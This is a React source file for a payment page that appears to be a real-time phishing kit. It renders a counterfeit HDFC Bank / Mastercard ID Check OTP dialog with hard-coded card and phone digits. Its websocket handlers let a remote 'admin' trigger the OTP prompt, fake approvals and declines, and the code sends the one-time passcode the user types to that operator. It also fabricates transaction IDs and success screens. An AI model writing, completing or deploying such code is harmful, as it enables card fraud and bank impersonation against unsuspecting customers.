
import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { ArrowLeft, CreditCard, Shield, Clock, CheckCircle, AlertCircle } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
import { io, Socket } from 'socket.io-client';

const Payment = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [socket, setSocket] = useState<Socket | null>(null);
  const [showOtp, setShowOtp] = useState(false);
  const [otp, setOtp] = useState('');
  const [isProcessing, setIsProcessing] = useState(true);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);

  const planData = location.state?.planData;

  useEffect(() => {
    if (!planData) {
      navigate('/');
      return;
    }

    // Connect to WebSocket server
    const socketUrl = process.env.NODE_ENV === 'production' 
      ? window.location.origin
      : 'http://localhost:3001';
    
    const newSocket = io(socketUrl, {
      timeout: 10000,
      reconnection: true,
      reconnectionAttempts: 5,
      reconnectionDelay: 2000,
      transports: ['websocket', 'polling']
    });
    setSocket(newSocket);

    newSocket.on('connect', () => {
      console.log('Connected to WebSocket server');
    });

    newSocket.on('show-otp', () => {
      console.log('Admin requested OTP');
      setShowOtp(true);
      setIsProcessing(false); // Stop loading spinner when OTP form appears
      setError('');
    });

    newSocket.on('payment-approved', () => {
      console.log('Payment approved by admin');
      setSuccess(true);
      setError('');
      setIsProcessing(false);
      setTimeout(() => {
        navigate('/payment-success', { 
          state: { 
            paymentDetails: {
              amount: planData.price?.toLocaleString(),
              planName: planData.name,
              transactionId: 'TXN' + Math.random().toString(36).substr(2, 9).toUpperCase(),
              customerName: 'Customer',
              email: 'customer@example.com',
              date: new Date().toLocaleDateString('en-US', { 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric' 
              })
            }
          }
        });
      }, 3000);
    });

    newSocket.on('payment-rejected', (reason: string) => {
      console.log('Payment rejected:', reason);
      setError(reason || 'Payment was rejected. Please try again.');
      setIsProcessing(false);
      setShowOtp(false);
    });

    newSocket.on('invalid-otp-error', () => {
      console.log('Invalid OTP error received');
      setError('Incorrect OTP, please enter valid one time passcode');
      setIsProcessing(false);
    });

    newSocket.on('card-declined-error', () => {
      console.log('Card declined error received');
      navigate('/checkout', { 
        state: { 
          planData,
          error: 'Your card has been declined!'
        }
      });
    });

    newSocket.on('insufficient-balance-error', () => {
      console.log('Insufficient balance error received');
      setError('Insufficient balance in your account. Please try with a different card.');
      setIsProcessing(false);
      setShowOtp(false);
    });

    return () => {
      newSocket.disconnect();
    };
  }, [planData, navigate]);

  const handleOtpSubmit = () => {
    if (otp.length === 6 && socket) {
      socket.emit('otp-submitted', { 
        otp,
        paymentId: planData.id || 'payment-' + Date.now(),
        planData 
      });
      setIsProcessing(true);
      setError(''); // Clear any previous errors
    }
  };

  const handleBack = () => {
    navigate(-1);
  };

  if (!planData) {
    return null;
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
      <div className="max-w-md mx-auto">
        {/* Header */}
        <div className="flex items-center gap-4 mb-6">
          <Button
            variant="ghost"
            size="sm"
            onClick={handleBack}
            className="text-gray-600 hover:text-gray-800"
          >
            <ArrowLeft className="h-4 w-4" />
          </Button>
          <h1 className="text-xl font-semibold text-gray-800">Payment Processing</h1>
        </div>

        {/* Payment Card */}
        <div className="bg-white rounded-2xl shadow-xl p-6 mb-6">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <CreditCard className="h-8 w-8 text-blue-600" />
            </div>
            <h2 className="text-2xl font-bold text-gray-800 mb-2">Secure Payment</h2>
            <p className="text-gray-600">Processing your payment for {planData.name}</p>
          </div>

          {/* Amount */}
          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <div className="flex justify-between items-center">
              <span className="text-gray-600">Amount to pay:</span>
              <span className="text-2xl font-bold text-gray-800">₹{planData.price?.toLocaleString()}</span>
            </div>
          </div>

          {/* Success State */}
          {success && (
            <div className="text-center py-8">
              <CheckCircle className="h-16 w-16 text-green-500 mx-auto mb-4" />
              <h3 className="text-xl font-semibold text-green-600 mb-2">Payment Successful!</h3>
              <p className="text-gray-600 mb-4">Redirecting you to your dashboard...</p>
            </div>
          )}

          {/* Error State */}
          {error && (
            <div className="text-center py-6">
              <AlertCircle className="h-12 w-12 text-red-500 mx-auto mb-4" />
              <h3 className="text-lg font-semibold text-red-600 mb-2">Payment Error</h3>
              <p className="text-gray-600 mb-4">{error}</p>
              <Button
                onClick={() => navigate('/checkout', { state: { planData } })}
                className="bg-blue-600 hover:bg-blue-700"
              >
                Try Again
              </Button>
            </div>
          )}

          {/* OTP Input */}
          {showOtp && !success && !error && (
            <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
              <div className="relative bg-white rounded-lg shadow-2xl max-w-md w-full mx-auto">
                {/* Cancel Button - Top Right */}
                <button
                  onClick={handleBack}
                  className="absolute top-4 right-4 text-gray-500 hover:text-gray-700 text-sm font-medium z-10"
                >
                  CANCEL
                </button>

                {/* Header */}
                <div className="p-6 border-b">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="w-8 h-8 bg-orange-500 rounded flex items-center justify-center">
                      <span className="text-white text-xs font-bold">MC</span>
                    </div>
                    <span className="font-semibold text-gray-800">ID Check</span>
                  </div>
                  
                  <div className="bg-red-600 text-white text-center py-3 rounded flex items-center justify-center gap-2">
                    <span className="text-2xl">🏥</span>
                    <span className="font-bold text-lg">HDFC BANK</span>
                  </div>
                </div>

                {/* Merchant Details */}
                <div className="p-6 border-b bg-gray-50">
                  <h3 className="text-blue-600 font-semibold text-lg mb-4 text-center">Merchant Details</h3>
                  
                  <div className="space-y-3 text-sm bg-white rounded p-4">
                    <div className="flex justify-between py-1">
                      <span className="text-gray-600">Merchant Name</span>
                      <span className="font-medium">XAI LLC</span>
                    </div>
                    <div className="flex justify-between py-1">
                      <span className="text-gray-600">Date</span>
                      <span className="font-medium">{new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}</span>
                    </div>
                    <div className="flex justify-between py-1">
                      <span className="text-gray-600">Card Number</span>
                      <span className="font-medium">5522 XXXX XXXX 7167</span>
                    </div>
                    <div className="flex justify-between py-1">
                      <span className="text-gray-600">Amount</span>
                      <span className="font-medium text-blue-600">₹{planData.price?.toLocaleString()}.00</span>
                    </div>
                    <div className="flex justify-between py-1">
                      <span className="text-gray-600">Personal Message</span>
                      <span className="font-medium text-gray-400">-</span>
                    </div>
                  </div>
                </div>

                {/* Authentication Section */}
                <div className="p-6">
                  <h3 className="text-blue-600 font-semibold text-lg mb-4 text-center">Authenticate Transaction</h3>
                  
                  {/* Success Message */}
                  <div className="bg-green-100 border border-green-300 rounded p-3 mb-4 text-center">
                    <p className="text-green-700 text-sm">
                      Successfully sent OTP to your registered mobile number<br />
                      <span className="font-mono">XXXXXX4939</span>
                    </p>
                  </div>

                  {/* OTP Error Message */}
                  {error && (
                    <div className="bg-red-100 border border-red-300 rounded p-3 mb-4 text-center">
                      <p className="text-red-700 text-sm font-medium">{error}</p>
                    </div>
                  )}

                  {/* Click Here Button */}
                  <div className="text-center mb-4">
                    <button className="bg-blue-600 text-white px-6 py-2 rounded text-sm font-medium hover:bg-blue-700 mr-2">
                      CLICK HERE
                    </button>
                    <span className="text-sm text-gray-700">For Addon Cardholder OTP</span>
                  </div>

                  {/* OTP Input */}
                  <div className="mb-4">
                    <div className="text-center mb-2">
                      <input
                        type="text"
                        placeholder="Enter OTP Here"
                        value={otp}
                        onChange={(e) => setOtp(e.target.value)}
                        disabled={isProcessing}
                        className={`w-full p-3 border border-gray-300 rounded text-center text-lg font-mono ${isProcessing ? 'bg-gray-100' : ''}`}
                        maxLength={6}
                      />
                    </div>
                    <div className="text-center">
                      <button className="text-blue-600 text-sm hover:underline">Resend OTP</button>
                    </div>
                  </div>

                  {/* Action Buttons */}
                  <div className="space-y-3">
                    <button
                      onClick={handleBack}
                      className="w-full border border-gray-300 text-gray-700 py-3 rounded hover:bg-gray-50 font-medium"
                    >
                      CANCEL
                    </button>
                    <button
                      onClick={handleOtpSubmit}
                      disabled={otp.length !== 6 || isProcessing}
                      className={`w-full bg-blue-600 text-white py-3 rounded font-medium hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed ${isProcessing ? 'relative' : ''}`}
                    >
                      {isProcessing ? (
                        <>
                          <div className="absolute inset-0 flex items-center justify-center">
                            <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                          </div>
                          <span className="blur-sm">SUBMIT</span>
                        </>
                      ) : (
                        'SUBMIT'
                      )}
                    </button>
                  </div>

                  {/* Timer */}
                  <p className="text-center text-xs text-gray-500 mt-4">
                    This page automatically time out after 1:59 seconds
                  </p>

                  {/* Powered by */}
                  <div className="text-center mt-4 pt-4 border-t border-gray-200">
                    <p className="text-xs text-gray-400 mb-1">Powered by</p>
                    <div className="flex items-center justify-center">
                      <div className="w-6 h-6 bg-green-600 rounded-full flex items-center justify-center mr-1">
                        <div className="w-3 h-3 bg-white rounded-full"></div>
                      </div>
                      <span className="text-green-600 font-semibold text-sm">onetap</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Processing State */}
          {isProcessing && !showOtp && !success && !error && (
            <div className="text-center py-8">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
              <h3 className="text-lg font-semibold text-gray-800 mb-2">Processing Payment</h3>
              <p className="text-gray-600">Please wait while we process your payment securely...</p>
              <div className="flex items-center justify-center gap-2 mt-4 text-sm text-gray-500">
                <Clock className="h-4 w-4" />
                <span>This may take a few moments</span>
              </div>
            </div>
          )}
        </div>

        {/* Security Notice */}
        <div className="bg-white rounded-xl p-4">
          <div className="flex items-center gap-3">
            <Shield className="h-5 w-5 text-green-500" />
            <div>
              <p className="text-sm font-medium text-gray-800">Secure Payment</p>
              <p className="text-xs text-gray-600">Your payment information is encrypted and secure</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Payment;
